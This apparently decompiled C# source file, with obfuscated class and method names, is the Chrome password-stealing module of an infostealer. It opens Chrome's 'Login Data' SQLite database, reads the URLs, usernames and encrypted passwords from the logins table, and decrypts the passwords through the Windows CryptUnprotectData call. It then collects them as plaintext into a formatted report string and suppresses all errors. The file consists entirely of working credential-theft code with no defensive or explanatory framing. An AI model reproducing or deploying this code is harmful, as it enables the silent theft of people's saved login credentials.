using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class5
{
	[Flags]
	public enum Enum0
	{
		flag_0 = 1,
		flag_1 = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct0
	{
		public int int_0;

		public Enum0 enum0_0;

		public IntPtr intptr_0;

		public string string_0;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct1
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	public static string string_0;

	public static object object_0 = "============Chrome==============\r\n";

	public static void smethod_0()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				SQLiteHandler sQLiteHandler = new SQLiteHandler(text);
				sQLiteHandler.ReadTable("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = sQLiteHandler.GetRowCount() - 1;
				for (int i = 0; i <= num; i++)
				{
					string value = sQLiteHandler.GetValue(i, "origin_url");
					string value2 = sQLiteHandler.GetValue(i, "username_value");
					string text2 = smethod_1(Encoding.Default.GetBytes(sQLiteHandler.GetValue(i, "password_value")));
					if ((Operators.CompareString(value2, "", false) != 0) & (Operators.CompareString(text2, "", false) != 0))
					{
						string_0 = "\r\nURL: " + value + "\r\nUsername: " + value2 + "\r\nPassword: " + text2 + "\r\n ";
						object_0 = Operators.AddObject(object_0, (object)string_0);
					}
				}
				object_0 = Operators.AddObject(object_0, (object)"\r\n================================\r\n\r\n");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Struct1 struct1_0, string string_1, ref Struct1 struct1_1, IntPtr intptr_0, ref Struct0 struct0_0, int int_0, ref Struct1 struct1_2);

	public static string smethod_1(byte[] byte_0)
	{
		Struct1 struct1_ = default(Struct1);
		Struct1 struct1_2 = default(Struct1);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		struct1_.intptr_0 = gCHandle.AddrOfPinnedObject();
		struct1_.int_0 = byte_0.Length;
		gCHandle.Free();
		Struct1 @struct = default(Struct1);
		Struct1 struct1_3 = @struct;
		Struct0 struct2 = default(Struct0);
		Struct0 struct0_ = struct2;
		IntPtr intptr_ = default(IntPtr);
		CryptUnprotectData(ref struct1_, null, ref struct1_3, intptr_, ref struct0_, 0, ref struct1_2);
		checked
		{
			byte[] array = new byte[struct1_2.int_0 + 1];
			Marshal.Copy(struct1_2.intptr_0, array, 0, struct1_2.int_0);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}
}
